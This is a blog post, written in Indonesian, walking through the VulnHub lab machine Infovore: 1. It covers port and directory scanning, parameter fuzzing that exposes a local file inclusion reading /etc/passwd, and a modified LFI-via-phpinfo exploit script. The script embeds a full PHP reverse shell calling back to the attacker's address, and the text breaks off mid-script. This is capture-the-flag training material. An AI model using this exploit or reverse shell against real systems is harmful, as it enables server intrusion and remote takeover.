<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>VulnHub - Infovore: 1 | sharpicx</title>
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="VulnHub - Infovore: 1" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="(Old-Post) Seperti biasa, latian kecil-kecilan bersama mesin baru di VH karna sudah mumet dan rada males dengan mesin-mesin di HTB. Malas karena difficulty yang tidak setara denga skill saya yang masih rendah. Easy = Medium, Medium = Hard dst. Daripada basa basi tidak jelas mending simak writeup yang satu ini. Selamat Membaca." />
<meta property="og:description" content="(Old-Post) Seperti biasa, latian kecil-kecilan bersama mesin baru di VH karna sudah mumet dan rada males dengan mesin-mesin di HTB. Malas karena difficulty yang tidak setara denga skill saya yang masih rendah. Easy = Medium, Medium = Hard dst. Daripada basa basi tidak jelas mending simak writeup yang satu ini. Selamat Membaca." />
<link rel="canonical" href="http://localhost:4000/2020/06/29/vh-infovore" />
<meta property="og:url" content="http://localhost:4000/2020/06/29/vh-infovore" />
<meta property="og:site_name" content="sharpicx" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-06-29T19:55:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="VulnHub - Infovore: 1" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-06-29T19:55:00+07:00","datePublished":"2020-06-29T19:55:00+07:00","description":"(Old-Post) Seperti biasa, latian kecil-kecilan bersama mesin baru di VH karna sudah mumet dan rada males dengan mesin-mesin di HTB. Malas karena difficulty yang tidak setara denga skill saya yang masih rendah. Easy = Medium, Medium = Hard dst. Daripada basa basi tidak jelas mending simak writeup yang satu ini. Selamat Membaca.","headline":"VulnHub - Infovore: 1","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/06/29/vh-infovore"},"url":"http://localhost:4000/2020/06/29/vh-infovore"}</script>
<!-- End Jekyll SEO tag -->


<meta name="keywords" content="LFI,RCE" />

<link rel="shortcut icon" href="/favicon.ico" />
<link rel="apple-touch-icon" href="/favicon.ico"/>
<link rel="alternate" type="application/rss+xml" title="sharpicx - linux & cybersecurity big fan " href="/feed.xml" />
<link rel="stylesheet" type="text/css" href="/assets/css/base.css" />
<link rel="stylesheet" type="text/css" href="/assets/css/highlight.css" />
<!-- <link rel="stylesheet" href="https://hackerthemes.com/bootstrap-themes/demo/theme-machine/neon-glow/css/bootstrap4-neon-glow.min.css"> -->
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

<!--[if lt IE 9]>
  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->


<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async ></script>


<script src="/assets/script/jekyllpaper.js" async ></script>
<script src="https://unpkg.com/mermaid@8.5.1/dist/mermaid.min.js" onload="javascript:loadMermaid();" async></script>


</head>
<body>
  <div class="container-wrapper">
    <header class="container-header">
      <div class="header-info">
  <span class="header-info-name">sharpicx</span><br/>
  <span class="header-info-desc" style="padding-left: 25px">linux & cybersecurity big fan </span>
</div>
<nav class="header-nav">
  <ul class="header-main-nav">
  
    <li class="header-main-nav-item"><a href="/">home</a></li>
  
    <li class="header-main-nav-item"><a href="/category">categories</a></li>
  
    <li class="header-main-nav-item"><a href="/about">whoami</a></li>
  
  </ul>
</nav>

    </header>
    <main class="container-main">
      <article class="container-post">
  <div class="post-title" style="padding: 0px 0px 20px 0px">
    <h1>VulnHub - Infovore: 1</h1>
  </div>
  <div class="post-author">
    <span>sharpicx</span>
  </div>
  <div class="post-content">
    <p>(Old-Post)
Seperti biasa, latian kecil-kecilan bersama mesin baru di <a href="https://vulnhub.com">VH</a> karna sudah mumet dan rada males dengan mesin-mesin di <a href="https://hackthebox.eu">HTB</a>. Malas karena difficulty yang tidak setara denga skill saya yang masih rendah. Easy = Medium, Medium = Hard dst. Daripada basa basi tidak jelas mending simak writeup yang satu ini. Selamat Membaca.</p>

<p><strong><a href="https://www.vulnhub.com/entry/infovore-1,496/">Infovore: 1</a></strong></p>

<h2 id="netdiscover-">NetDiscover ?</h2>
<p>kayanya mesin / box kali ini gk perlu pake <code class="language-plaintext highlighter-rouge">NetDiscover</code> karena sudah tercantum dari sananya heheh.</p>
<p align="left">
<img src="https://i.gyazo.com/85f9bf01f011cc4f5c263f5d753c70c8.png" />
</p>

<h1 id="recon">Recon</h1>
<h2 id="nmap">Nmap</h2>
<p><code class="language-plaintext highlighter-rouge">rustscan -T 1500 -- A -sC -sV -oN infovore.scan 192.168.59.129</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[root@skofos]──[~/Desktop/vh/infovore]                                                                                                                                                 
└──# <span class="nb">cat </span>infovore.scan                                                                                                                                                                    
<span class="c"># Nmap 7.80 scan initiated Mon Jul 27 12:59:55 2020 as: nmap -A -sC -sV -oN infovore.scan -Pn -vvv -p 80 192.168.59.129                                                                   </span>
Nmap scan report <span class="k">for </span>192.168.59.129                                                                                                                                                       
Host is up, received user-set <span class="o">(</span>0.0020s latency<span class="o">)</span><span class="nb">.</span>                                                                                                                                          
Scanned at 2020-07-27 12:59:57 EDT <span class="k">for </span>8s                                                                                                                                                 
                                                                                                                                                                                          
PORT   STATE SERVICE REASON          VERSION                                                                                                                                              
80/tcp open  http    syn-ack ttl 128 Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>                                                                                                                       
| http-methods:                                                                                                                                                                           
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                              
|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>                                                                                                                                              
|_http-title: Include me ...                                                                                                                                                              
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                     
Device <span class="nb">type</span>: WAP                                                                                                                                                                          
Running: Actiontec embedded, Linux                                                                                                                                                        
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel                                                                                                                          
OS details: Actiontec MI424WR-GEN3I WAP                                                                                                                                                   
TCP/IP fingerprint:                                                                                                                                                                       
OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.80%E<span class="o">=</span>4%D<span class="o">=</span>7/27%OT<span class="o">=</span>80%CT<span class="o">=</span>%CU<span class="o">=</span>%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>N%TM<span class="o">=</span>5F1F0815%P<span class="o">=</span>x8                                                                                                               
OS:6_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>FE%GCD<span class="o">=</span>1%ISR<span class="o">=</span>FF%TI<span class="o">=</span>I%II<span class="o">=</span>I%SS<span class="o">=</span>S%TS<span class="o">=</span>U<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M5B4                                                                                                               
OS:%O2<span class="o">=</span>M5B4%O3<span class="o">=</span>M5B4%O4<span class="o">=</span>M5B4%O5<span class="o">=</span>M5B4%O6<span class="o">=</span>M5B4<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FAF0%W2<span class="o">=</span>FAF0%W3<span class="o">=</span>FAF0%W4<span class="o">=</span>                                                                                                               
OS:FAF0%W5<span class="o">=</span>FAF0%W6<span class="o">=</span>FAF0<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%TG<span class="o">=</span>80%W<span class="o">=</span>FAF0%O<span class="o">=</span>M5B4%CC<span class="o">=</span>N%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>                                                                                                               
OS:N%TG<span class="o">=</span>80%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%TG<span class="o">=</span>80%W<span class="o">=</span>FAF0%S<span class="o">=</span>O%A<span class="o">=</span>S+%F                                                                                                               
OS:<span class="o">=</span>AS%O<span class="o">=</span>M5B4%RD<span class="o">=</span>0%Q<span class="o">=)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%TG<span class="o">=</span>80%W<span class="o">=</span>7FFF%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>                                                                                                               
OS:Y%DF<span class="o">=</span>N%TG<span class="o">=</span>80%W<span class="o">=</span>7FFF%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%TG<span class="o">=</span>80%CD<span class="o">=</span>                                                                                                               
OS:S<span class="o">)</span>                                                                                                                                                                                     
                                                                                                                                                                                          
Network Distance: 2 hops                                                                                                                                                                  
TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>254 <span class="o">(</span>Good luck!<span class="o">)</span>                                                                                                                                      
IP ID Sequence Generation: Incremental                                                                                                                                                    
                                                                                                                                                                                          
TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>                                                                                                                                                            
HOP RTT     ADDRESS                                                                                                                                                                       
1   1.12 ms 192.168.172.2                                                                                                                                                                 
2   1.47 ms 192.168.59.129                                                                                                                                                                
                                                                                                                                                                                          
Read data files from: /usr/bin/../share/nmap                                                                                                                                              
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>                                                                                     
<span class="c"># Nmap done at Mon Jul 27 13:00:05 2020 -- 1 IP address (1 host up) scanned in 10.95 seconds</span>
</code></pre></div></div>
<p>kalo diliat-liat ini cuma web sederhana yang dibuat dari template” bootstrap. ga ada yang menarik lagian cuma one page doang.</p>

<h2 id="gobuster">Gobuster</h2>
<p><code class="language-plaintext highlighter-rouge">gobuster dir http://192.168.59.129 -w /usr/share/wordlists/dirb/common.txt -o infovore.gobuster</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/.hta <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                                       
/.hta.php <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                                   
/.hta.html <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                                  
/.hta.bak <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                                   
/.hta.txt <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                                   
/.hta.php.bak <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                               
/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                                  
/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                              
/.htaccess.html <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                             
/.htaccess.bak <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                              
/.htaccess.txt <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                              
/.htaccess.php.bak <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                          
/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                                  
/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                              
/.htpasswd.html <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                             
/.htpasswd.bak <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                              
/.htpasswd.txt <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                              
/.htpasswd.php.bak <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                          
/css <span class="o">(</span>Status: 301<span class="o">)</span>                                                                                                                                                                        
/img <span class="o">(</span>Status: 301<span class="o">)</span>                                                                                                                                                                        
/index.html <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                                 
/index.php <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                                  
/index.html <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                                 
/index.php <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                                  
/info.php <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                                   
/info.php <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                                   
/server-status <span class="o">(</span>Status: 403<span class="o">)</span>                                                                                                                                                              
/vendor <span class="o">(</span>Status: 301<span class="o">)</span>
</code></pre></div></div>
<p>wakakakak apaa niiihhh, <code class="language-plaintext highlighter-rouge">index.php</code><code class="language-plaintext highlighter-rouge">info.php</code> :D, sepertinya menariikk. wah wah wajib diliat niih.</p>
<div align="left">
<img src="https://i.postimg.cc/1zvCPFXK/somethingphp.png" />
</div>

<h1 id="wfuzz">Wfuzz</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[root@skofos]──[~/Desktop/vh/infovore]                                                                                                                                               
└──# wfuzz <span class="nt">-u</span> <span class="s1">'http://192.168.59.129/index.php?FUZZ=/etc/passwd/'</span> <span class="nt">-w</span> /root/Desktop/tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt <span class="nt">--hw</span> 382                               
                                                                                                                                                                                        
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.                               
                                                                                                                                                                                        
********************************************************                                                                                                                                
* Wfuzz 2.4.5 - The Web Fuzzer                         *                                                                                                                                
********************************************************                                                                                                                                
                                                                                                                                                                                        
Target: http://192.168.59.129/index.php?FUZZ=/etc/passwd/                                                                                                                               
Total requests: 2588                                                                                                                                                                    
                                                                                                                                                                                        
===================================================================                                                                                                                     
ID           Response   Lines    Word     Chars       Payload                                                                                                                           
===================================================================                                                                                                                     
                                                                                                                                                                                        
000000072:   200        7 L      9 W      80 Ch       "filename"                                                                                                             

Total time: 10.46127                                                                                                                                                                    
Processed Requests: 2588                                                                                                                                                                
Filtered Requests: 2587                                                                                                                                                                 
Requests/sec.: 247.3886
</span></code></pre></div></div>
<p>yep, interesting. lalu saya coba. and boom.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</code></pre></div></div>
<p>suatu informasi yang sangat bermafaat. wekekekeke.</p>

<h1 id="lfi-to-rce-exploit">LFI to RCE Exploit</h1>

<p>dugaan saya benar ini adalah LFI (Local File Inclusion) dari yang saya pelajari ini biasanya ditemukan di PhpInfo” gitu tau dah heheheh, saya cari di github. Apakah ada tools yang bisa mengeksekusi / mengexploitasi. wah akhirnya ketemu juga. <a href="https://github.com/M4LV0/LFI-phpinfo-RCE/">LFI-PhpInfo-RCE</a>.
lalu kode tools itu saya modifikasi sedikit menjadi seperti ini.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python 
</span>


<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">socket</span>

<span class="k">def</span> <span class="nf">setup</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">TAG</span><span class="o">=</span><span class="s">"Security Test"</span>
    <span class="n">PAYLOAD</span><span class="o">=</span><span class="s">"""%s</span><span class="se">\r</span><span class="s">
&lt;?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.59.132';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
//
// Daemonise ourself if possible to avoid zombies later
//
// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
// Change to a safe directory
chdir("/");
// Remove any umask we inherited
umask(0);
//
// Do the reverse shell...
//
// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
// Spawn shell process
$descriptorspec = array(
   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string</span><span class="se">\n</span><span class="s">";
	}
}
?&gt; 
</span><span class="se">\r</span><span class="s">"""</span> <span class="o">%</span> <span class="n">TAG</span>
    <span class="n">REQ1_DATA</span><span class="o">=</span><span class="s">"""-----------------------------7dbff1ded0714</span><span class="se">\r</span><span class="s">
Content-Disposition: form-data; name="dummyname"; filename="test.txt"</span><span class="se">\r</span><span class="s">
Content-Type: text/plain</span><span class="se">\r</span><span class="s">
</span><span class="se">\r</span><span class="s">
%s
-----------------------------7dbff1ded0714--</span><span class="se">\r</span><span class="s">"""</span> <span class="o">%</span> <span class="n">PAYLOAD</span>
    <span class="n">padding</span><span class="o">=</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">6000</span>
    <span class="n">REQ1</span><span class="o">=</span><span class="s">"""POST /info.php?a="""</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s">""" HTTP/1.1</span><span class="se">\r</span><span class="s">
HTTP_ACCEPT: """</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="s">"""</span><span class="se">\r</span><span class="s">
HTTP_USER_AGENT: """</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s">"""</span><span class="se">\r</span><span class="s">
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714</span><span class="se">\r</span><span class="s">
Content-Length: %s</span><span class="se">\r</span><span class="s">
Host: %s</span><span class="se">\r</span><span class="s">
</span><span class="se">\r</span><span class="s">
%s"""</span> <span class="o">%</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">REQ1_DATA</span><span class="p">),</span><span class="n">host</span><span class="p">,</span><span class="n">REQ1_DATA</span><span class="p">)</span>
    <span class="c1">#modify this to suit the LFI script   
</span>    <span class="n">LFIREQ</span><span class="o">=</span><span class="s">"""GET /index.php?filename=%s HTTP/1.1</span><span class="se">\r</span><span class="s">
User-Agent: Mozilla/4.0</span><span class="se">\r</span><span class="s">
Proxy-Connection: Keep-Alive</span><span class="se">\r</span><span class="s">
Host: %s</span><span class="se">\r</span><span class="s">
</span><span class="se">\r</span><span class="s">
</span><span class="se">\r</span><span class="s">
"""</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">REQ1</span><span class="p">,</span> <span class="n">TAG</span><span class="p">,</span> <span class="n">LFIREQ</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">phpInfoLFI</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">phpinforeq</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">lfireq</span><span class="p">,</span> <span class="n">tag</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s2</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>    

    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">s2</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>

    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">phpinforeq</span><span class="p">)</span>
    <span class="n">d</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">offset</span><span class="p">:</span>
        <span class="n">d</span> <span class="o">+=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">d</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"[tmp_name] =&amp;gt"</span><span class="p">)</span>
        <span class="n">fn</span> <span class="o">=</span> <span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">17</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">31</span><span class="p">]</span>
    <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">None</span>

    <span class="n">s2</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">lfireq</span> <span class="o">%</span> <span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">host</span><span class="p">))</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">s2</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">s2</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">d</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">tag</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">fn</span>

<span class="n">counter</span><span class="o">=</span><span class="mi">0</span>
<span class="k">class</span> <span class="nc">ThreadWorker</span><span class="p">(</span><span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
        <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">.</span><span class="n">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">event</span> <span class="o">=</span> <span class="n">e</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">lock</span> <span class="o">=</span>  <span class="n">l</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">maxattempts</span> <span class="o">=</span> <span class="n">m</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">args</span> <span class="o">=</span> <span class="n">args</span>

    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">counter</span>
        <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">event</span><span class="p">.</span><span class="n">is_set</span><span class="p">():</span>
            <span class="k">with</span> <span class="bp">self</span><span class="p">.</span><span class="n">lock</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="p">.</span><span class="n">maxattempts</span><span class="p">:</span>
                    <span class="k">return</span>
                <span class="n">counter</span><span class="o">+=</span><span class="mi">1</span>

            <span class="k">try</span><span class="p">:</span>
                <span class="n">x</span> <span class="o">=</span> <span class="n">phpInfoLFI</span><span class="p">(</span><span class="o">*</span><span class="bp">self</span><span class="p">.</span><span class="n">args</span><span class="p">)</span>
                <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">event</span><span class="p">.</span><span class="n">is_set</span><span class="p">():</span>
                    <span class="k">break</span>                
                <span class="k">if</span> <span class="n">x</span><span class="p">:</span>
                    <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">Got it! Shell created in /tmp/g"</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">event</span><span class="p">.</span><span class="nb">set</span><span class="p">()</span>
                    
            <span class="k">except</span> <span class="n">socket</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
                <span class="k">return</span>
    

<span class="k">def</span> <span class="nf">getOffset</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">phpinforeq</span><span class="p">):</span>
    <span class="s">"""Gets offset of tmp_name in the php output"""</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">phpinforeq</span><span class="p">)</span>
    
    <span class="n">d</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
        <span class="n">d</span><span class="o">+=</span><span class="n">i</span>        
